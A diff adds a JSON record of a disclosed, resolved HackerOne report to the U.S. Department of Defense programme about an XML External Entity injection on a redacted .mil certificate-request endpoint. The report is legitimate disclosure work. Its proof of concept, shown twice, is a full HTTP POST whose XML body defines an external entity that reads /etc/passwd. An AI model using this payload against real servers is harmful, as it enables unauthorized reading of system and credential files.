@@ -1,0 +1,118 @@
+{
+  "id": 2573567,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNTczNTY3",
+  "url": "https://hackerone.com/reports/2573567",
+  "title": "XML External Entity (XXE) Injection",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2024-06-25T02:10:18.151Z",
+  "submitted_at": "2024-06-25T02:10:18.267Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "maskedpersian",
+    "url": "/maskedpersian",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ykh4v12r4cygxt6ovv6bjr3c6viu/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16064,
+    "url": "https://hackerone.com/deptofdefense",
+    "handle": "deptofdefense",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "U.S. Dept Of Defense",
+      "twitter_handle": "DC3VDP",
+      "website": "https://bit.ly/3ntULtN",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2024-07-19T14:41:33.156Z",
+  "bug_reporter_agreed_on_going_public_at": "2024-07-02T20:25:34.588Z",
+  "team_member_agreed_on_going_public_at": "2024-07-19T14:41:32.989Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "XML External Entity (XXE) injection vulnerability. XXE vulnerabilities occur when an application parses XML input that contains a reference to an external entity. When the XML parser is improperly configured to process external entities, it can allow an attacker to:\nRead arbitrary files on the server.\nPerform server-side request forgery (SSRF).\nConduct denial-of-service (DoS) attacks.\nExecute remote code (in rare cases).\nHost name: \t███████.mil\n\nPOC:\n```\nPOST /ca/rest/certrequests HTTP/1.1\nHost: ████████\nSec-Ch-Ua: \"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"Windows\"\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-Dest: frame\nReferer: https://███████/ca/ee/ca/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9,fa;q=0.8\nPriority: u=0, i\nConnection: close\nContent-Type: application/xml\nContent-Length: 194\n\n<!--?xml version=\"2.0\" ?-->\n<!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/passwd\"> ]>\n<CertEnrollmentRequest>\n  <Attributes/>\n  <ProfileID>&ent;</ProfileID>\n</CertEnrollmentRequest>\n```\n\n## Impact\n\nExploitation of this vulnerability can lead to:\n1-Confidentiality Breach: Unauthorized access to sensitive information stored on the server.\n2-Integrity Violation: Potential manipulation or corruption of application data.\n3-Availability Disruption: Possible denial-of-service conditions due to resource exhaustion or application crashes.\n4-Remote Code Execution: In extreme cases, execution of arbitrary commands on the server.\n\n## System Host(s)\n█████████.mil\n\n## Affected Product(s) and Version(s)\n\n\n## CVE Numbers\n\n\n## Steps to Reproduce\n```\nPOST /ca/rest/certrequests HTTP/1.1\nHost: ██████\nSec-Ch-Ua: \"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"Windows\"\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-Dest: frame\nReferer: https://██████████/ca/ee/ca/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9,fa;q=0.8\nPriority: u=0, i\nConnection: close\nContent-Type: application/xml\nContent-Length: 194\n\n<!--?xml version=\"2.0\" ?-->\n<!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/passwd\"> ]>\n<CertEnrollmentRequest>\n  <Attributes/>\n  <ProfileID>&ent;</ProfileID>\n</CertEnrollmentRequest>\n```\n\n## Suggested Mitigation/Remediation Actions\n\n\n",
+  "weakness": {
+    "id": 54,
+    "name": "XML External Entities (XXE)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 21,
+  "voters": [
+    "loaymorad",
+    "m4khn0",
+    "zy9ard3",
+    "maskedpersian",
+    "shubham_srt",
+    "2026",
+    "sil_sec",
+    "iwasday",
+    "mr-inspector",
+    "jirosec",
+    "and 11 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
